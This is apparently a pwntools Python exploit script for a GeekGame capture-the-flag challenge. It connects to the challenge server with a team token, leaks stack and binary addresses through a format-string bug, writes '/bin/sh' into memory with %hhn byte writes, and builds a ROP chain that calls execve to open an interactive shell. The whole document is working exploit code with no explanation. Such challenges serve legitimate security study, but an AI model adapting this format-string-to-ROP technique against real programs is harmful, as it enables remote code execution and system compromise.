from pwn import *
from LibcSearcher import *
import re

is_remote = True
if is_remote:
    ip = "prob09.geekgame.pku.edu.cn"
    port = 10009
    token = b"9:How do you know my uid is 9"
    p = remote(ip, port)
    p.sendline(token)
else:
    p = process('./pwn')

elf = ELF('./pwn')

def find_hex(text):
    print(f"debug find_hex: {text}")
    return int(re.search(b'0x([0-9a-f]+)', text).group(1),16)

p1 = b'%167$p'
p.recvuntil(b"instruction")
p.sendline(p1)

ret = p.recvuntil(b"instruction")
ret = find_hex(ret)

base_addr = ret - 0xAC20

def get_rsp():
    p.sendline(b"(((%p)))")
    sleep(.05)
    ret = find_hex(p.recvuntil(b"instruction")) - 0x60
    print(f"found rsp: {hex(ret)}")
    return ret

def write_bytes(offset, data, absolute=False):
    rsp = get_rsp()
    for i, b in enumerate(data):
        print(f"debug: writing byte {i}, {b}")
        pos = offset + i
        if not absolute:
            pos += rsp + 0x4f0
        f = f'%{b}c%38$hhn' if b else '%38$hhn'
        f = f.encode()
        payload = f + b'\0' * (0x20 - len(f)) + p64(pos)
        print("payload: ", payload)
        p.sendline(payload)
        sleep(.05)
        p.recvuntil(b'instruction')

def retback():
    p.sendline(b"exit")
    sleep(.05)
    # ret = p.recvuntil(b"instruction")
    ret = p.recv()
    return ret

rsp = get_rsp()
binsh_pos = rsp + 0x1000
write_bytes(binsh_pos, b"/bin/sh\0", absolute=True)

pop_rax = base_addr + 0x5a777	# pop %rax; ret
pop_rdi = base_addr + 0x9cd2	# pop %rdi; ret
pop_rsi = base_addr + 0x1781e	# pop %rsi; ret
pop_rdx = base_addr + 0x9bdf	# pop %rdx; ret
syscall = base_addr + 0x9643	# syscall

write_bytes(8, 
            p64(pop_rax)
        +   p64(0x3b)
        +   p64(pop_rdi)
        +   p64(binsh_pos)
        +   p64(pop_rdx)
        +   p64(0)
        +   p64(pop_rsi)
        +   p64(0)
        +   p64(syscall)
)

retback()

p.interactive()